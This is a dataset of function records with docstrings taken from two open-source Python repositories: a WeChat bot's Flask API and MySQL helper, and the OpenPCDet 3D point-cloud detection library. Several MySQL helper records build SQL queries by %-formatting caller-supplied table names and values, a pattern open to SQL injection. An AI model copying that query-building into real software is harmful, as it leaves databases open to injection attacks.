{"docstring": "\"\"\"\n@brief      send emotion to user or gourp\n@param      to: String, user id or group id\n@param      emot: String, emotion file name\n\"\"\"\n", "func_signal": "def send_emot(to, emot):\n", "code": "emot_path = os.path.join(app.config['UPLOAD_FOLDER'], emot)\nreturn jsonify({'ret': 0 if wechat.send_emot(to, emot_path) else 1})", "path": "WeixinBot/wxbot_project_py2.7/weixin_bot.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      send file to mass users or gourps\n\"\"\"\n", "func_signal": "def mass_send_file():\n", "code": "j = mass_send(request.method, request.json, wechat.webwxsendappmsg)\nreturn jsonify(j)", "path": "WeixinBot/wxbot_project_py2.7/weixin_bot.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      send emoticon to mass users or gourps\n\"\"\"\n", "func_signal": "def mass_send_emot():\n", "code": "j = mass_send(request.method, request.json, wechat.webwxsendemoticon)\nreturn jsonify(j)", "path": "WeixinBot/wxbot_project_py2.7/weixin_bot.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      list group member\n@param      g_id String\n\"\"\"\n", "func_signal": "def group_member_list(g_id):\n", "code": "result = wechat.db.select(Constant.TABLE_GROUP_USER_LIST(), 'RoomID', g_id)\nreturn jsonify({'count': len(result), 'member': result})", "path": "WeixinBot/wxbot_project_py2.7/weixin_bot.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      Delete a table in database\n@param      table  String\n\"\"\"\n", "func_signal": "def delete_table(self, table):\n", "code": "if table in self.table_cols:\n    sql = \"DROP TABLE IF EXISTS %s\" % table\n    Log.debug('DB -> %s' % sql)\n    self.execute(sql)\n    self.table_cols.pop(table)", "path": "WeixinBot/wxbot_project_py2.7/db/mysql_db.py", "commit_date": "2017-04-16 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      select all result from table\n@param      table  String\n@return     result  Array\n\"\"\"\n", "func_signal": "def get_table_column_name(self, table):\n", "code": "c = self.conn.cursor()\nc.execute(\"SELECT * FROM %s\" % table)\nnames = list(map(lambda x: x[0], c.description))\nreturn names", "path": "WeixinBot/wxbot_project_py2.7/db/mysql_db.py", "commit_date": "2017-04-16 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      close connection to database\n\"\"\"\n", "func_signal": "def close(self):\n", "code": "Log.debug('DB -> close')\n# \u5173\u95ed\u6570\u636e\u5e93\u8fde\u63a5\nself.conn.close()", "path": "WeixinBot/wxbot_project_py2.7/db/mysql_db.py", "commit_date": "2017-04-16 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      Creates a table in database\n@param      table  String\n@param      cols   String, the cols in table\n\"\"\"\n", "func_signal": "def create_table(self, table, cols):\n", "code": "if table not in self.table_cols:\n    sql = 'CREATE TABLE IF NOT EXISTS %s(id int primary key auto_increment, %s) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci' % (table, cols)\n    Log.debug('DB -> %s' % sql)\n    self.execute(sql)\n    self.table_cols[table] = ['id'] + [c.strip().split(' ')[0] for c in cols.split(',')]", "path": "WeixinBot/wxbot_project_py2.7/db/mysql_db.py", "commit_date": "2017-04-16 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      Insert many rows in table\n@param      table  String\n@param      values  Array of tuple\n\"\"\"\n", "func_signal": "def insertmany(self, table, values):\n", "code": "col_name = self.table_cols[table][1:]\nsql = 'INSERT INTO %s(%s) VALUES (%s)' % (table, ','.join(col_name), ','.join(['%s'] * len(values[0])))\nLog.debug('DB -> %s' % sql)\nself.execute(sql, values)", "path": "WeixinBot/wxbot_project_py2.7/db/mysql_db.py", "commit_date": "2017-04-16 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      list groups\n\"\"\"\n", "func_signal": "def group_list():\n", "code": "result = wechat.db.select(Constant.TABLE_GROUP_LIST())\nreturn jsonify({'count': len(result), 'group': result})", "path": "WeixinBot/wxbot_project_py2.7/weixin_bot.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      send image to user or gourp\n@param      to: String, user id or group id\n@param      img: String, image file name\n\"\"\"\n", "func_signal": "def send_img(to, img):\n", "code": "img_path = os.path.join(app.config['UPLOAD_FOLDER'], img)\nreturn jsonify({'ret': 0 if wechat.send_img(to, img_path) else 1})", "path": "WeixinBot/wxbot_project_py2.7/weixin_bot.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      send file to user or gourp\n@param      to: String, user id or group id\n@param      file: String, file name\n\"\"\"\n", "func_signal": "def send_file(to, file):\n", "code": "file_path = os.path.join(app.config['UPLOAD_FOLDER'], file)\nreturn jsonify({'ret': 0 if wechat.send_file(to, file_path) else 1})", "path": "WeixinBot/wxbot_project_py2.7/weixin_bot.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      execute sql commands, return result if it has\n@param      table  String\n@param      field  String\n@param      condition  String\n\"\"\"\n", "func_signal": "def delete(self, table, field='', condition=''):\n", "code": "sql = \"DELETE FROM %s WHERE %s=%s\" % (table, field, condition)\nLog.debug('DB -> %s' % sql)\nself.execute(sql)", "path": "WeixinBot/wxbot_project_py2.7/db/mysql_db.py", "commit_date": "2017-04-16 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      Creates a database\n@param      db_name  String\n\"\"\"\n", "func_signal": "def create_db(self, db_name):\n", "code": "if self.conf['database'] not in self.show_database():\n    sql = 'CREATE DATABASE IF NOT EXISTS %s CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci' % db_name\n    Log.debug('DB -> %s' % sql)\n    self.execute(sql)", "path": "WeixinBot/wxbot_project_py2.7/db/mysql_db.py", "commit_date": "2017-04-16 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      send iamge to mass users or gourps\n\"\"\"\n", "func_signal": "def mass_send_img():\n", "code": "j = mass_send(request.method, request.json, wechat.webwxsendmsgimg)\nreturn jsonify(j)", "path": "WeixinBot/wxbot_project_py2.7/weixin_bot.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      Insert a row in table\n@param      table  String\n@param      value  Tuple\n\"\"\"\n", "func_signal": "def insert(self, table, value):\n", "code": "col_name = self.table_cols[table][1:]\nsql = \"INSERT INTO %s(%s) VALUES (%s)\" % (table, str(','.join(col_name)), array_join(value, ','))\nLog.debug('DB -> %s' % sql)\nself.execute(sql)", "path": "WeixinBot/wxbot_project_py2.7/db/mysql_db.py", "commit_date": "2017-04-16 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      select all result from table\n@param      table  String\n@param      field  String\n@param      condition  String\n@return     result  Tuple\n\"\"\"\n", "func_signal": "def select(self, table, field='', condition=''):\n", "code": "sql = \"SELECT * FROM %s\" % table\nif field and condition:\n    sql += \" WHERE %s='%s'\" % (field, condition)\nLog.debug('DB -> %s' % sql)\nreturn self.execute(sql)", "path": "WeixinBot/wxbot_project_py2.7/db/mysql_db.py", "commit_date": "2017-04-16 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "#return self._showQRCodeImg()\n", "func_signal": "def genQRCode(self):\n", "code": "if sys.platform.startswith('win'):\n    self._showQRCodeImg('win')\nelif sys.platform.find('darwin') >= 0:\n    self._showQRCodeImg('macos')\nelse:\n    self._str2qr('https://login.weixin.qq.com/l/' + self.uuid)", "path": "WeixinBot/wxbot_demo_py3/weixin.py", "commit_date": "2017-05-22 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      send text to mass users or gourps\n\"\"\"\n", "func_signal": "def mass_send_msg():\n", "code": "j = mass_send(request.method, request.json, wechat.send_text)\nreturn jsonify(j)", "path": "WeixinBot/wxbot_project_py2.7/weixin_bot.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\n@brief      list group chat log\n@param      g_name String\n\"\"\"\n", "func_signal": "def group_chat_log(g_name):\n", "code": "result = wechat.db.select(Constant.TABLE_GROUP_MSG_LOG, 'RoomName', g_name)\nreturn jsonify({'count': len(result), 'chats': result})", "path": "WeixinBot/wxbot_project_py2.7/weixin_bot.py", "commit_date": "2017-05-25 00:00:00", "repo_name": "Urinx/WeixinBot", "stars": 7136, "license": "apache-2.0", "language": "python", "size": 1175}
{"docstring": "\"\"\"\nArgs:\n    box_encodings: (N, 8 + C) [x, y, z, dx, dy, dz, cos, sin, ...]\n    points: [x, y, z]\n    pred_classes: (N) [1, num_classes]\nReturns:\n\n\"\"\"\n", "func_signal": "def decode_torch(self, box_encodings, points, pred_classes=None):\n", "code": "xt, yt, zt, dxt, dyt, dzt, cost, sint, *cts = torch.split(box_encodings, 1, dim=-1)\nxa, ya, za = torch.split(points, 1, dim=-1)\n\nif self.use_mean_size:\n    assert pred_classes.max() <= self.mean_size.shape[0]\n    point_anchor_size = self.mean_size[pred_classes - 1]\n    dxa, dya, dza = torch.split(point_anchor_size, 1, dim=-1)\n    diagonal = torch.sqrt(dxa ** 2 + dya ** 2)\n    xg = xt * diagonal + xa\n    yg = yt * diagonal + ya\n    zg = zt * dza + za\n\n    dxg = torch.exp(dxt) * dxa\n    dyg = torch.exp(dyt) * dya\n    dzg = torch.exp(dzt) * dza\nelse:\n    xg = xt + xa\n    yg = yt + ya\n    zg = zt + za\n    dxg, dyg, dzg = torch.split(torch.exp(box_encodings[..., 3:6]), 1, dim=-1)\n\nrg = torch.atan2(sint, cost)\n\ncgs = [t for t in cts]\nreturn torch.cat([xg, yg, zg, dxg, dyg, dzg, rg, *cgs], dim=-1)", "path": "OpenPCDet/pcdet/utils/box_coder_utils.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "# ONLY support overlap in CAMERA, not lider.\n", "func_signal": "def d3_box_overlap_kernel(boxes, qboxes, rinc, criterion=-1):\n", "code": "N, K = boxes.shape[0], qboxes.shape[0]\nfor i in range(N):\n    for j in range(K):\n        if rinc[i, j] > 0:\n            # iw = (min(boxes[i, 1] + boxes[i, 4], qboxes[j, 1] +\n            #         qboxes[j, 4]) - max(boxes[i, 1], qboxes[j, 1]))\n            iw = (min(boxes[i, 1], qboxes[j, 1]) - max(\n                boxes[i, 1] - boxes[i, 4], qboxes[j, 1] - qboxes[j, 4]))\n\n            if iw > 0:\n                area1 = boxes[i, 3] * boxes[i, 4] * boxes[i, 5]\n                area2 = qboxes[j, 3] * qboxes[j, 4] * qboxes[j, 5]\n                inc = iw * rinc[i, j]\n                if criterion == -1:\n                    ua = (area1 + area2 - inc)\n                elif criterion == 0:\n                    ua = area1\n                elif criterion == 1:\n                    ua = area2\n                else:\n                    ua = inc\n                rinc[i, j] = inc / ua\n            else:\n                rinc[i, j] = 0.0", "path": "OpenPCDet/pcdet/datasets/kitti/kitti_object_eval_python/eval.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"fast iou algorithm. this function can be used independently to\ndo result analysis. Must be used in CAMERA coordinate system.\nArgs:\n    gt_annos: dict, must from get_label_annos() in kitti_common.py\n    dt_annos: dict, must from get_label_annos() in kitti_common.py\n    metric: eval type. 0: bbox, 1: bev, 2: 3d\n    num_parts: int. a parameter for fast calculate algorithm\n\"\"\"\n", "func_signal": "def calculate_iou_partly(gt_annos, dt_annos, metric, num_parts=50):\n", "code": "assert len(gt_annos) == len(dt_annos)\ntotal_dt_num = np.stack([len(a[\"name\"]) for a in dt_annos], 0)\ntotal_gt_num = np.stack([len(a[\"name\"]) for a in gt_annos], 0)\nnum_examples = len(gt_annos)\nsplit_parts = get_split_parts(num_examples, num_parts)\nparted_overlaps = []\nexample_idx = 0\n\nfor num_part in split_parts:\n    gt_annos_part = gt_annos[example_idx:example_idx + num_part]\n    dt_annos_part = dt_annos[example_idx:example_idx + num_part]\n    if metric == 0:\n        gt_boxes = np.concatenate([a[\"bbox\"] for a in gt_annos_part], 0)\n        dt_boxes = np.concatenate([a[\"bbox\"] for a in dt_annos_part], 0)\n        overlap_part = image_box_overlap(gt_boxes, dt_boxes)\n    elif metric == 1:\n        loc = np.concatenate(\n            [a[\"location\"][:, [0, 2]] for a in gt_annos_part], 0)\n        dims = np.concatenate(\n            [a[\"dimensions\"][:, [0, 2]] for a in gt_annos_part], 0)\n        rots = np.concatenate([a[\"rotation_y\"] for a in gt_annos_part], 0)\n        gt_boxes = np.concatenate(\n            [loc, dims, rots[..., np.newaxis]], axis=1)\n        loc = np.concatenate(\n            [a[\"location\"][:, [0, 2]] for a in dt_annos_part], 0)\n        dims = np.concatenate(\n            [a[\"dimensions\"][:, [0, 2]] for a in dt_annos_part], 0)\n        rots = np.concatenate([a[\"rotation_y\"] for a in dt_annos_part], 0)\n        dt_boxes = np.concatenate(\n            [loc, dims, rots[..., np.newaxis]], axis=1)\n        overlap_part = bev_box_overlap(gt_boxes, dt_boxes).astype(\n            np.float64)\n    elif metric == 2:\n        loc = np.concatenate([a[\"location\"] for a in gt_annos_part], 0)\n        dims = np.concatenate([a[\"dimensions\"] for a in gt_annos_part], 0)\n        rots = np.concatenate([a[\"rotation_y\"] for a in gt_annos_part], 0)\n        gt_boxes = np.concatenate(\n            [loc, dims, rots[..., np.newaxis]], axis=1)\n        loc = np.concatenate([a[\"location\"] for a in dt_annos_part], 0)\n        dims = np.concatenate([a[\"dimensions\"] for a in dt_annos_part], 0)\n        rots = np.concatenate([a[\"rotation_y\"] for a in dt_annos_part], 0)\n        dt_boxes = np.concatenate(\n            [loc, dims, rots[..., np.newaxis]], axis=1)\n        overlap_part = d3_box_overlap(gt_boxes, dt_boxes).astype(\n            np.float64)\n    else:\n        raise ValueError(\"unknown metric\")\n    parted_overlaps.append(overlap_part)\n    example_idx += num_part\noverlaps = []\nexample_idx = 0\nfor j, num_part in enumerate(split_parts):\n    gt_annos_part = gt_annos[example_idx:example_idx + num_part]\n    dt_annos_part = dt_annos[example_idx:example_idx + num_part]\n    gt_num_idx, dt_num_idx = 0, 0\n    for i in range(num_part):\n        gt_box_num = total_gt_num[example_idx + i]\n        dt_box_num = total_dt_num[example_idx + i]\n        overlaps.append(\n            parted_overlaps[j][gt_num_idx:gt_num_idx + gt_box_num,\n                               dt_num_idx:dt_num_idx + dt_box_num])\n        gt_num_idx += gt_box_num\n        dt_num_idx += dt_box_num\n    example_idx += num_part\n\nreturn overlaps, parted_overlaps, total_gt_num, total_dt_num", "path": "OpenPCDet/pcdet/datasets/kitti/kitti_object_eval_python/eval.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\nArgs:\n    batch_dict:\n        batch_size: int\n        vfe_features: (num_voxels, C)\n        points: (num_points, 4 + C), [batch_idx, x, y, z, ...]\nReturns:\n    batch_dict:\n        encoded_spconv_tensor: sparse tensor\n        point_features: (N, C)\n\"\"\"\n", "func_signal": "def forward(self, batch_dict):\n", "code": "batch_size = batch_dict['batch_size']\npoints = batch_dict['points']\nbatch_idx, xyz, features = self.break_up_pc(points)\n\nxyz_batch_cnt = xyz.new_zeros(batch_size).int()\nfor bs_idx in range(batch_size):\n    xyz_batch_cnt[bs_idx] = (batch_idx == bs_idx).sum()\n\nassert xyz_batch_cnt.min() == xyz_batch_cnt.max()\nxyz = xyz.view(batch_size, -1, 3)\nfeatures = features.view(batch_size, -1, features.shape[-1]).permute(0, 2, 1) if features is not None else None\n\nl_xyz, l_features = [xyz], [features]\nfor i in range(len(self.SA_modules)):\n    li_xyz, li_features = self.SA_modules[i](l_xyz[i], l_features[i])\n    l_xyz.append(li_xyz)\n    l_features.append(li_features)\n\nfor i in range(-1, -(len(self.FP_modules) + 1), -1):\n    l_features[i - 1] = self.FP_modules[i](\n        l_xyz[i - 1], l_xyz[i], l_features[i - 1], l_features[i]\n    )  # (B, C, N)\n\npoint_features = l_features[0].permute(0, 2, 1).contiguous()  # (B, N, C)\nbatch_dict['point_features'] = point_features.view(-1, point_features.shape[-1])\nbatch_dict['point_coords'] = torch.cat((batch_idx[:, None].float(), l_xyz[0].view(-1, 3)), dim=1)\nreturn batch_dict", "path": "OpenPCDet/pcdet/models/backbones_3d/pointnet2_backbone.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\nArgs:\n    box_encodings:  (B, N, 7 + ?) x, y, z, w, l, h, r, custom values\n    anchors: (B, N, 7 + C) or (N, 7 + C) [x, y, z, dx, dy, dz, heading, ...]\n\nReturns:\n\n\"\"\"\n", "func_signal": "def decode_torch(box_encodings, anchors):\n", "code": "xa, ya, za, dxa, dya, dza, ra, *cas = torch.split(anchors, 1, dim=-1)\nxt, yt, zt, wt, lt, ht, rt, *cts = torch.split(box_encodings, 1, dim=-1)\n\ndiagonal = torch.sqrt(dxa ** 2 + dya ** 2)\nxg = xt * diagonal + xa\nyg = yt * diagonal + ya\nzg = zt * dza + za\n\ndxg = torch.exp(lt) * dxa\ndyg = torch.exp(wt) * dya\ndzg = torch.exp(ht) * dza\nrg = ra - rt\n\ncgs = [t + a for t, a in zip(cts, cas)]\nreturn torch.cat([xg, yg, zg, dxg, dyg, dzg, rg, *cgs], dim=-1)", "path": "OpenPCDet/pcdet/utils/box_coder_utils.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\n:param pts: (N, 3 or 2)\n:return pts_hom: (N, 4 or 3)\n\"\"\"\n", "func_signal": "def cart_to_hom(self, pts):\n", "code": "pts_hom = np.hstack((pts, np.ones((pts.shape[0], 1), dtype=np.float32)))\nreturn pts_hom", "path": "OpenPCDet/pcdet/utils/calibration_kitti.py", "commit_date": "2020-06-23 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\n:param u: (N)\n:param v: (N)\n:param depth_rect: (N)\n:return:\n\"\"\"\n", "func_signal": "def img_to_rect(self, u, v, depth_rect):\n", "code": "x = ((u - self.cu) * depth_rect) / self.fu + self.tx\ny = ((v - self.cv) * depth_rect) / self.fv + self.ty\npts_rect = np.concatenate((x.reshape(-1, 1), y.reshape(-1, 1), depth_rect.reshape(-1, 1)), axis=1)\nreturn pts_rect", "path": "OpenPCDet/pcdet/utils/calibration_kitti.py", "commit_date": "2020-06-23 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\nArgs:\n    box_encodings: (B, N, 7 + C) or (N, 7 + C) [x, y, z, dx, dy, dz, heading or *[cos, sin], ...]\n    anchors: (B, N, 7 + C) or (N, 7 + C) [x, y, z, dx, dy, dz, heading, ...]\n\nReturns:\n\n\"\"\"\n", "func_signal": "def decode_torch(self, box_encodings, anchors):\n", "code": "xa, ya, za, dxa, dya, dza, ra, *cas = torch.split(anchors, 1, dim=-1)\nif not self.encode_angle_by_sincos:\n    xt, yt, zt, dxt, dyt, dzt, rt, *cts = torch.split(box_encodings, 1, dim=-1)\nelse:\n    xt, yt, zt, dxt, dyt, dzt, cost, sint, *cts = torch.split(box_encodings, 1, dim=-1)\n\ndiagonal = torch.sqrt(dxa ** 2 + dya ** 2)\nxg = xt * diagonal + xa\nyg = yt * diagonal + ya\nzg = zt * dza + za\n\ndxg = torch.exp(dxt) * dxa\ndyg = torch.exp(dyt) * dya\ndzg = torch.exp(dzt) * dza\n\nif self.encode_angle_by_sincos:\n    rg_cos = cost + torch.cos(ra)\n    rg_sin = sint + torch.sin(ra)\n    rg = torch.atan2(rg_sin, rg_cos)\nelse:\n    rg = rt + ra\n\ncgs = [t + a for t, a in zip(cts, cas)]\nreturn torch.cat([xg, yg, zg, dxg, dyg, dzg, rg, *cgs], dim=-1)", "path": "OpenPCDet/pcdet/utils/box_coder_utils.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\nArgs:\n    data_dict:\n        points: (N, 3 + C_in)\n        gt_boxes: optional, (N, 7 + C) [x, y, z, dx, dy, dz, heading, ...]\n        gt_names: optional, (N), string\n        ...\n\nReturns:\n    data_dict:\n        frame_id: string\n        points: (N, 3 + C_in)\n        gt_boxes: optional, (N, 7 + C) [x, y, z, dx, dy, dz, heading, ...]\n        gt_names: optional, (N), string\n        use_lead_xyz: bool\n        voxels: optional (num_voxels, max_points_per_voxel, 3 + C)\n        voxel_coords: optional (num_voxels, 3)\n        voxel_num_points: optional (num_voxels)\n        ...\n\"\"\"\n", "func_signal": "def prepare_data(self, data_dict):\n", "code": "if self.training:\n    assert 'gt_boxes' in data_dict, 'gt_boxes should be provided for training'\n    gt_boxes_mask = np.array([n in self.class_names for n in data_dict['gt_names']], dtype=np.bool_)\n\n    data_dict = self.data_augmentor.forward(\n        data_dict={\n            **data_dict,\n            'gt_boxes_mask': gt_boxes_mask\n        }\n    )\n\nif data_dict.get('gt_boxes', None) is not None:\n    selected = common_utils.keep_arrays_by_name(data_dict['gt_names'], self.class_names)\n    data_dict['gt_boxes'] = data_dict['gt_boxes'][selected]\n    data_dict['gt_names'] = data_dict['gt_names'][selected]\n    gt_classes = np.array([self.class_names.index(n) + 1 for n in data_dict['gt_names']], dtype=np.int32)\n    gt_boxes = np.concatenate((data_dict['gt_boxes'], gt_classes.reshape(-1, 1).astype(np.float32)), axis=1)\n    data_dict['gt_boxes'] = gt_boxes\n\ndata_dict = self.point_feature_encoder.forward(data_dict)\n\ndata_dict = self.data_processor.forward(\n    data_dict=data_dict\n)\n\nif self.training and len(data_dict['gt_boxes']) == 0:\n    new_index = np.random.randint(self.__len__())\n    return self.__getitem__(new_index)\n\ndata_dict.pop('gt_names', None)\n\nreturn data_dict", "path": "OpenPCDet/pcdet/datasets/dataset.py", "commit_date": "2020-11-07 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\n:param pts_lidar: (N, 3)\n:return pts_rect: (N, 3)\n\"\"\"\n", "func_signal": "def lidar_to_rect(self, pts_lidar):\n", "code": "pts_lidar_hom = self.cart_to_hom(pts_lidar)\npts_rect = np.dot(pts_lidar_hom, np.dot(self.V2C.T, self.R0.T))\n# pts_rect = reduce(np.dot, (pts_lidar_hom, self.V2C.T, self.R0.T))\nreturn pts_rect", "path": "OpenPCDet/pcdet/utils/calibration_kitti.py", "commit_date": "2020-06-23 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\nArgs:\n    box_encodings:  (B, N, 7 + ?) x, y, z, w, l, h, r, custom values\n    anchors: (B, N, 7 + C) or (N, 7 + C) [x, y, z, dx, dy, dz, heading, ...]\n\nReturns:\n\n\"\"\"\n", "func_signal": "def decode_torch(box_encodings, anchors):\n", "code": "xa, ya, za, dxa, dya, dza, ra, *cas = torch.split(anchors, 1, dim=-1)\nxt, yt, zt, wt, lt, ht, rt, *cts = torch.split(box_encodings, 1, dim=-1)\n\ndiagonal = torch.sqrt(dxa ** 2 + dya ** 2)\nxg = xt * diagonal + xa\nyg = yt * diagonal + ya\nzg = zt * dza + za\n\ndxg = torch.exp(lt) * dxa\ndyg = torch.exp(wt) * dya\ndzg = torch.exp(ht) * dza\nrg = rt + ra\n\ncgs = [t + a for t, a in zip(cts, cas)]\nreturn torch.cat([xg, yg, zg, dxg, dyg, dzg, rg, *cgs], dim=-1)", "path": "OpenPCDet/pcdet/utils/box_coder_utils.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\n:param corners3d: (N, 8, 3) corners in rect coordinate\n:return: boxes: (None, 4) [x1, y1, x2, y2] in rgb coordinate\n:return: boxes_corner: (None, 8) [xi, yi] in rgb coordinate\n\"\"\"\n", "func_signal": "def corners3d_to_img_boxes(self, corners3d):\n", "code": "sample_num = corners3d.shape[0]\ncorners3d_hom = np.concatenate((corners3d, np.ones((sample_num, 8, 1))), axis=2)  # (N, 8, 4)\n\nimg_pts = np.matmul(corners3d_hom, self.P2.T)  # (N, 8, 3)\n\nx, y = img_pts[:, :, 0] / img_pts[:, :, 2], img_pts[:, :, 1] / img_pts[:, :, 2]\nx1, y1 = np.min(x, axis=1), np.min(y, axis=1)\nx2, y2 = np.max(x, axis=1), np.max(y, axis=1)\n\nboxes = np.concatenate((x1.reshape(-1, 1), y1.reshape(-1, 1), x2.reshape(-1, 1), y2.reshape(-1, 1)), axis=1)\nboxes_corner = np.concatenate((x.reshape(-1, 8, 1), y.reshape(-1, 8, 1)), axis=2)\n\nreturn boxes, boxes_corner", "path": "OpenPCDet/pcdet/utils/calibration_kitti.py", "commit_date": "2020-06-23 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\n:param pts_lidar: (N, 3)\n:return pts_img: (N, 2)\n\"\"\"\n", "func_signal": "def lidar_to_img(self, pts_lidar):\n", "code": "pts_rect = self.lidar_to_rect(pts_lidar)\npts_img, pts_depth = self.rect_to_img(pts_rect)\nreturn pts_img, pts_depth", "path": "OpenPCDet/pcdet/utils/calibration_kitti.py", "commit_date": "2020-06-23 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
{"docstring": "\"\"\"\nArgs:\n    gt_boxes: (N, 7 + C) [x, y, z, dx, dy, dz, heading, ...]\n    points: (N, 3) [x, y, z]\n    gt_classes: (N) [1, num_classes]\nReturns:\n    box_coding: (N, 8 + C)\n\"\"\"\n", "func_signal": "def encode_torch(self, gt_boxes, points, gt_classes=None):\n", "code": "gt_boxes[:, 3:6] = torch.clamp_min(gt_boxes[:, 3:6], min=1e-5)\n\nxg, yg, zg, dxg, dyg, dzg, rg, *cgs = torch.split(gt_boxes, 1, dim=-1)\nxa, ya, za = torch.split(points, 1, dim=-1)\n\nif self.use_mean_size:\n    assert gt_classes.max() <= self.mean_size.shape[0]\n    point_anchor_size = self.mean_size[gt_classes - 1]\n    dxa, dya, dza = torch.split(point_anchor_size, 1, dim=-1)\n    diagonal = torch.sqrt(dxa ** 2 + dya ** 2)\n    xt = (xg - xa) / diagonal\n    yt = (yg - ya) / diagonal\n    zt = (zg - za) / dza\n    dxt = torch.log(dxg / dxa)\n    dyt = torch.log(dyg / dya)\n    dzt = torch.log(dzg / dza)\nelse:\n    xt = (xg - xa)\n    yt = (yg - ya)\n    zt = (zg - za)\n    dxt = torch.log(dxg)\n    dyt = torch.log(dyg)\n    dzt = torch.log(dzg)\n\ncts = [g for g in cgs]\nreturn torch.cat([xt, yt, zt, dxt, dyt, dzt, torch.cos(rg), torch.sin(rg), *cts], dim=-1)", "path": "OpenPCDet/pcdet/utils/box_coder_utils.py", "commit_date": "2020-07-30 00:00:00", "repo_name": "open-mmlab/OpenPCDet", "stars": 4207, "license": "apache-2.0", "language": "python", "size": 4280}
